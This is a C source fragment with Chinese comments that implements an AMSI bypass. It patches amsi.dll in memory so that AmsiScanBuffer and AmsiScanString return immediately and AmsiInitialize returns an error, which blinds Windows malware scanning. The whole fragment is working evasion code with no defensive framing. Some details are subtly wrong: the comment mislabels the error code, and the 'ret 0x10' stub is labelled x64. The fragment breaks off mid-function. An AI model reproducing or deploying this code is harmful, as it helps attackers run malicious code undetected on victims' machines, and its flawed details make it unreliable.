// AMSI: 三个 patch 一起打, 覆盖静态调用/动态解析/PowerShell 内部路径
//
//   1) amsi.dll!AmsiScanBuffer ->  ret          (C3)
//   2) amsi.dll!AmsiScanString  ->  ret          (C3)
//   3) amsi.dll!AmsiInitialize  ->  E_NOTIMPL + ret
//        B8 05 40 00 80   mov eax, 0x80004005 (E_NOTIMPL)
//        C2 10 00         ret  0x10   (4 个参数 x64)
//
//   说明: AmsiScanBuffer/ScanString 的首字节 c3 是最小化改动 —— 寄存器返回
//   值保持调用方期望的形状, 但函数直接返回, 不再触碰 AmsiSession/AmsiContext。
//   如果后续某版本加了栈平衡包装, 用 _AmsiScanBuffer 的 IAT 或 trampoline 方案。
// ---------------------------------------------------------------------------
static patch_status AmsiBypass(void)
{
    unsigned char* amsi = GetModuleBasePC(L"amsi.dll");
    if (!amsi) return PATCH_NOT_FOUND;

    patch_status st = PATCH_NOT_FOUND;
    unsigned char ret1 = 0xC3;

    void* p;

    p = GetExport((HMODULE)amsi, "AmsiScanBuffer");
    if (p) { if (PatchBytes(p, &ret1, 1) == PATCH_OK) st = PATCH_OK; }

    p = GetExport((HMODULE)amsi, "AmsiScanString");
    if (p) { if (PatchBytes(p, &ret1, 1) == PATCH_OK) st = PATCH_OK; }

    // 不带参数的导出名 (ordinal 形)
    p = GetExport((HMODULE)amsi, "AmsiScanBuffer");
    if (!p) {
        p = (void*)GetProcAddress((HMODULE)amsi, (LPCSTR)(ULONG_PTR)1); // ord#1
        if (p && PatchBytes(p, &ret1, 1) == PATCH_OK) st = PATCH_OK;
    }

    p = GetExport((HMODULE)amsi, "AmsiInitialize");
    if (p) {
        static const unsigned char stub[] = { 0xB8,0x05,0x40,0x00,0x80, 0xC2,0x10,0x00 };
        if (PatchBytes(p, stub, sizeof stub) == PATCH_OK) st = PATCH_OK;
    }

